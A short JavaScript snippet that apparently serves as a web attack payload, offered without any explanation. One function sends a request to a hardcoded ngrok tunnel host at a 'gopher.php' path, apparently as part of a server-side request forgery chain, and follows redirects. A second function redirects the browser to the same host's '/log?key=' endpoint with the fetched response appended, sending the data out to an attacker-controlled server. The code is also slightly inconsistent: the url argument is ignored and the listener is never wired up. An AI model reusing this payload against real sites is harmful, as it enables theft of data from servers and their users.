function ajax(url /* ,params */, callback) {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
      // return if not ready state 4
      if (this.readyState !== 4) {
        return;
      }

      // check for redirect
      if (this.status === 302 /* or may any other redirect? */) {
        var location = this.getResponseHeader("Location");
        return ajax.call(this, location /*params*/, callback);
      } 

      // return data
      var data = JSON.parse(this.responseText);
      callback(data);
  }
  xmlhttp.open("GET", "https://e5cc-202-162-37-174.ngrok-free.app/gopher.php", true);
  xmlhttp.send();
}

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
